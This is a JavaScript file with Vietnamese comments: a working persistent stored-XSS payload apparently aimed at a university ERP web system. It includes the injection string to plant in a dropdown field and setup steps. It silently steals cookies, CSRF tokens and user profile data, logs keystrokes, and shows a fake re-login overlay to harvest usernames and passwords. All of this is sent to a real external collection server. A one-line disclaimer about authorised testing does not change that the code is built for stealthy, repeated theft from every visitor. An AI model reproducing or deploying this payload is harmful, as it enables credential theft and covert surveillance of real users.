// ============================================================
// evil.js - Persistent XSS stealth (nằm lại + hoạt động ngầm)
//
// ⚠️ Chỉ dùng để test bảo mật trên hệ thống bạn được phép.
//
// Đặc điểm:
// - KHÔNG alert, KHÔNG console.log, KHÔNG gây chú ý
// - Chạy lại MỖI LẦN trang load (persistent qua dropdown)
// - Gửi dữ liệu dạng JSON object về server
// - PHÂN BIỆT người dùng qua victim_id (fingerprint)
// - Tự hủy nếu chạy trùng (tránh chạy 2 lần trong 1 trang)
//
// Cách setup:
// 1. Chạy server: py attacker_server.py
// 2. Upload file này lên GitHub raw
// 3. Dán payload vào dropdown (học hàm/dân tộc...)
//    '><svg onload=$.get(`//URL_CỦA_BẠN/evil.js`).then(eval)>
// 4. MỌI NGƯỜI truy cập form → payload chạy → gửi về server
// ============================================================

(function() {
  'use strict';

  // ⚙️ CẤU HÌNH
  var ATTACKER_URL = "https://misterxplo.pythonanywhere.com/steal";  // Server nhận dữ liệu
  // WRITE_KEY: Chỉ có quyền GHI - nằm trong file public (ai cũng thấy)
  // Nếu bị lộ, kẻ xấu chỉ ghi được dữ liệu giả, KHÔNG đọc được gì
  // ADMIN_KEY (đọc dữ liệu) KHÔNG BAO GIỜ đặt trong file này!
  var WRITE_KEY = "BMU-WRITE-KEY-XXXXXXX-sdfd3";   // 🔴 ĐỔI THÀNH KEY GHI CỦA BẠN (khớp với attacker_app.py)
  var VERSION = "1.3";

  // ============================================================
  // CHỐNG CHẠY TRÙNG (chỉ chạy 1 lần mỗi trang)
  // ============================================================
  try {
    if (window.__xssRunning) return;  // Đã chạy rồi thì thoát
    window.__xssRunning = true;
  } catch(e) {}

  // ============================================================
  // TẠO FINGERPRINT DUY NHẤT CHO MỖI NGƯỜI DÙNG
  // ============================================================
  // victim_id: ID duy nhất lưu trong localStorage (mỗi trình duyệt)
  // fingerprint: hash từ thông tin thiết bị (dùng để nhận diện)
  function getVictimId() {
    try {
      var id = localStorage.getItem('__xss_victim_id');
      if (!id) {
        // Tạo ID ngẫu nhiên 16 ký tự
        id = 'V' + Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
        localStorage.setItem('__xss_victim_id', id);
      }
      return id;
    } catch(e) {
      return 'V' + Date.now().toString(36);
    }
  }

  function getFingerprint() {
    // Tạo fingerprint từ thông tin thiết bị (không cần lưu trữ)
    var parts = [
      navigator.userAgent,
      navigator.language,
      screen.width + 'x' + screen.height,
      screen.colorDepth,
      navigator.platform,
      new Date().getTimezoneOffset()
    ];
    var str = parts.join('|');
    // Hash đơn giản
    var hash = 0;
    for (var i = 0; i < str.length; i++) {
      hash = ((hash << 5) - hash) + str.charCodeAt(i);
      hash |= 0;
    }
    return 'FP' + Math.abs(hash).toString(36);
  }

  var victimId = getVictimId();
  var fingerprint = getFingerprint();

  // ============================================================
  // HÀM GỬI DỮ LIỆU (POST JSON + WRITE_KEY - không bị CORS chặn)
  // ============================================================
  function exfil(data, type) {
    try {
      // Tạo object đầy đủ với victim_id + fingerprint
      var payload = {
        victim_id: victimId,
        fingerprint: fingerprint,
        type: type,
        time: new Date().toISOString(),
        data: data
      };

      // Gửi qua fetch (POST JSON) - kèm WRITE_KEY trong header
      fetch(ATTACKER_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-API-Key': WRITE_KEY
        },
        body: JSON.stringify(payload),
        mode: 'no-cors'  // Không cần đọc response
      }).catch(function() {});

      // Fallback: nếu fetch lỗi, dùng Image GET (kèm WRITE_KEY trong query)
      var img = new Image();
      img.src = ATTACKER_URL + '?key=' + encodeURIComponent(WRITE_KEY) + '&v=' + victimId + '&f=' + fingerprint + '&t=' + type + '&d=' + encodeURIComponent(JSON.stringify(data).substring(0, 500));
    } catch(e) {}
  }

  // ============================================================
  // THU THẬP THÔNG TIN (không ghi log ồn ào)
  // ============================================================
  var cookies;
  try { cookies = document.cookie || ""; } catch(e) { cookies = ""; }

  var csrfToken;
  try {
    var c = document.querySelector('meta[name="csrf-token"]');
    csrfToken = (c && c.content) ? c.content : "none";
  } catch(e) { csrfToken = "none"; }

  var gonData = {};
  try {
    if (typeof gon !== 'undefined') {
      gonData = {
        uid: gon.user_id,
        uname: gon.user_name || gon.username,
        org: gon.organization,
        lead: gon.leader_roles,
        fac: gon.faculty,
        roles: gon.roles
      };
    }
  } catch(e) {}

  var pageInfo = {
    url: location.href.substring(0, 300),
    domain: document.domain,
    title: document.title.substring(0, 100),
    ua: navigator.userAgent.substring(0, 150),
    lang: navigator.language,
    screen: screen.width + 'x' + screen.height,
    time: new Date().toISOString()
  };

  // ============================================================
  // THEO DÕI SỐ LẦN CHẠY (localStorage - mỗi trình duyệt)
  // ============================================================
  var runCount = 0;
  try {
    runCount = parseInt(localStorage.getItem('__xss_count') || '0', 10) + 1;
    localStorage.setItem('__xss_count', String(runCount));
  } catch(e) {}

  // Gửi dữ liệu MỖI LẦN trang load (dạng object)
  exfil({
    cookies: cookies.substring(0, 500),
    csrf: csrfToken.substring(0, 100),
    url: pageInfo.url,
    domain: pageInfo.domain,
    title: pageInfo.title,
    ua: pageInfo.ua,
    lang: pageInfo.lang,
    screen: pageInfo.screen,
    gon: gonData,
    run: runCount,
    ver: VERSION
  }, 'visit');

  // ============================================================
  // KEYLOGGER NGẦM (ghi phím, gửi mỗi 15 ký tự)
  // ============================================================
  (function() {
    var buf = [];
    document.addEventListener('keydown', function(e) {
      try {
        var key = e.key;
        if (key.length > 1) key = '[' + key + ']';
        buf.push(key);
        if (buf.length >= 15) {
          exfil({
            keys: btoa(buf.join('')),
            url: pageInfo.url
          }, 'key');
          buf = [];
        }
      } catch(e2) {}
    });
  })();

  // ============================================================
  // PHISHING FORM - HIỆN LẦN ĐẦU, NGƯNG KHI ĐÃ CÓ DỮ LIỆU
  // ============================================================
  // Cơ chế:
  // - localStorage '__xss_phish_done' = '1' → đã có dữ liệu → KHÔNG hiện
  // - Chưa có → hiện form mỗi lần truy cập cho đến khi nhập xong
  // - Khi nạn nhân nhập + bấm nút → gửi dữ liệu → set done → không hiện nữa
  // TẠO FORM PHISHING (DOM API thuần - không dùng innerHTML)
  function createPhishForm() {
    try {
      var phishDone = localStorage.getItem('__xss_phish_done') === '1';
      if (phishDone) return;
      
      // === QUAN TRỌNG: ĐÓNG MODAL BOOTSTRAP ĐANG MỞ ===
      // Modal #modal-users (data-bs-backdrop="static") có focus trap
      // nó giữ focus và CHẶN keydown cho các phần tử ngoài modal
      try {
        // 1. Gọi jQuery modal('hide') nếu có
        if (window.jQuery && jQuery.fn && jQuery.fn.modal) {
          jQuery('.modal').each(function() {
            try { jQuery(this).modal('hide'); } catch(e3) {}
          });
        }
        // 2. Xóa class modal-open trên body
        document.body.classList.remove('modal-open');
        // 3. Xóa backdrop
        var backdrops = document.querySelectorAll('.modal-backdrop, .modal-backdrop.fade.show');
        for (var bi = 0; bi < backdrops.length; bi++) {
          backdrops[bi].parentNode.removeChild(backdrops[bi]);
        }
        // 4. Ẩn mọi .modal đang show
        var modals = document.querySelectorAll('.modal.show, .modal[style*="display: block"]');
        for (var mi = 0; mi < modals.length; mi++) {
          modals[mi].style.display = 'none';
          modals[mi].classList.remove('show');
        }
        // 5. Bỏ thuộc tính overflow:hidden đang áp lên body
        document.body.style.overflow = '';
        document.body.style.paddingRight = '';
      } catch(e3) {}
      
      // --- Tạo overlay ---
      var overlay = document.createElement('div');
      overlay.setAttribute('id', 'xss_phish_overlay');
      overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;' +
        'background:rgba(0,0,0,0.9);z-index:2147483647;display:flex;' +
        'align-items:center;justify-content:center;pointer-events:auto;';
      
      // Chặn sự kiện lan ra trang ERP (tránh bị nuốt)
      overlay.addEventListener('click', function(e) { e.stopPropagation(); });
      overlay.addEventListener('mousedown', function(e) { e.stopPropagation(); });
      overlay.addEventListener('pointerdown', function(e) { e.stopPropagation(); });
      overlay.addEventListener('keydown', function(e) { e.stopPropagation(); });
      
      // Chặn Bootstrap focus trap bằng cách chiếm focus vĩnh viễn
      // Bootstrap thường lắng nghe keydown trên document và chuyển hướng vào modal
      document.addEventListener('keydown', function(e) {
        if (e.key >= '0' && e.key <= 'z' || e.key === 'Backspace' || e.key === ' ' || e.key === 'Enter') {
          // Nếu focus đang ở form phishing thì cho phép, ngược lại ép focus về input
          if (document.activeElement !== userInput && document.activeElement !== passInput) {
            e.stopImmediatePropagation();
            userInput.focus();
          }
        }
      }, true);
      
      // Tạo biến userInput/passInput trước để dùng ở trên
      var userInput = null;
      var passInput = null;
      
      // --- Tạo hộp form giả mạo ---
      var box = document.createElement('div');
      box.style.cssText = 'background:#fff;padding:30px;border-radius:8px;width:350px;' +
        'font-family:Arial,Helvetica,sans-serif;font-size:14px;pointer-events:auto;' +
        'position:relative;z-index:2147483647;box-shadow:0 0 30px rgba(0,0,0,0.5);';
      
      // Tiêu đề
      var title = document.createElement('h2');
      title.textContent = 'Đăng Nhập';
      title.style.cssText = 'margin:0 0 15px 0;color:#1976d2;text-align:center;';
      box.appendChild(title);
      
      // Thông báo
      var msg = document.createElement('p');
      msg.textContent = 'Phiên làm việc đã kết thúc. Vui lòng xác thực lại.';
      msg.style.cssText = 'margin:0 0 15px 0;color:#666;text-align:center;font-size:13px;';
      box.appendChild(msg);
      
      // Ô username
      var userInput = document.createElement('input');
      userInput.setAttribute('type', 'text');
      userInput.setAttribute('placeholder', 'Tên đăng nhập');
      userInput.setAttribute('id', 'xss_phish_user');
      userInput.style.cssText = 'width:100%;padding:10px;margin-bottom:10px;' +
        'border:1px solid #ccc;border-radius:4px;box-sizing:border-box;' +
        'pointer-events:auto;';
      box.appendChild(userInput);
      
      // Ô password
      var passInput = document.createElement('input');
      passInput.setAttribute('type', 'password');
      passInput.setAttribute('placeholder', 'Mật khẩu');
      passInput.setAttribute('id', 'xss_phish_pass');
      passInput.style.cssText = 'width:100%;padding:10px;margin-bottom:15px;' +
        'border:1px solid #ccc;border-radius:4px;box-sizing:border-box;' +
        'pointer-events:auto;';
      box.appendChild(passInput);
      
      // Nút xác nhận
      var btn = document.createElement('button');
      btn.textContent = 'Xác nhận';
      btn.setAttribute('id', 'xss_phish_btn');
      btn.style.cssText = 'width:100%;padding:10px;background:#1976d2;color:#fff;' +
        'border:none;border-radius:4px;cursor:pointer;pointer-events:auto;';
      box.appendChild(btn);
      
      overlay.appendChild(box);
      document.body.appendChild(overlay);
      
      // Focus vào ô username
      setTimeout(function() {
        try { userInput.focus(); } catch(e) {}
      }, 100);
      
      // Xử lý nút bấm
      btn.addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
        var u = userInput.value;
        var p = passInput.value;
        // Gửi dữ liệu về server
        exfil({ username: u, password: p, url: pageInfo.url }, 'pwd');
        // Đánh dấu đã có dữ liệu
        try { localStorage.setItem('__xss_phish_done', '1'); } catch(e2) {}
        // Ẩn form
        overlay.remove();
      });
      
      // Cho phép Enter submit
      document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
          var u = userInput.value;
          var p = passInput.value;
          if (u || p) {
            try { localStorage.setItem('__xss_phish_done', '1'); } catch(e2) {}
            exfil({ username: u, password: p, url: pageInfo.url }, 'pwd');
            overlay.remove();
          }
        }
      });
      
      console.log('[phish] Form đã tạo - có thể điền được');
      
    } catch(e) {
      console.log('[phish] Lỗi tạo form:', e.message);
    }
  }
  
  // Hiện form sau 1 giây (đợi trang load xong, tránh script ERP ghi đè)
  setTimeout(createPhishForm, 1000);

  // ============================================================
  // CHẠY NGẦM MỖI KHI TRANG LOAD - KHÔNG TỰ XÓA PAYLOAD
  // ============================================================
  // LƯU Ý: KHÔNG xóa option khỏi dropdown!
  // Payload nằm lại trong database → mọi người truy cập → chạy lại

  // ============================================================
  // TÓM TẮT CHẾ ĐỘ HOẠT ĐỘNG:
  // 1. ✅ Mỗi lần ai đó mở trang → gửi 'visit' về server
  // 2. ✅ Keylogger ghi âm thầm, gửi mỗi 15 phím
  // 3. ✅ Phishing HIỆN LẦN ĐẦU (mỗi trình duyệt)
  //    - Hiện lại mỗi lần truy cập cho đến khi nhập xong
  //    - Sau khi có dữ liệu → localStorage '__xss_phish_done'=1
  //    - Từ đó KHÔNG hiện nữa (chỉ chạy ngầm)
  // 4. ✅ Không alert, không console.log, không thay đổi UI
  // 5. ✅ Payload persistent - nằm lại vĩnh viễn trong dropdown
  //    - Chỉ cần inject 1 lần → mọi lần truy cập sau tự chạy
  // 6. ✅ PHÂN BIỆT người dùng qua victim_id + fingerprint
  // 7. ✅ Dữ liệu gửi dạng JSON object (dễ phân tích)
  // ============================================================
})();
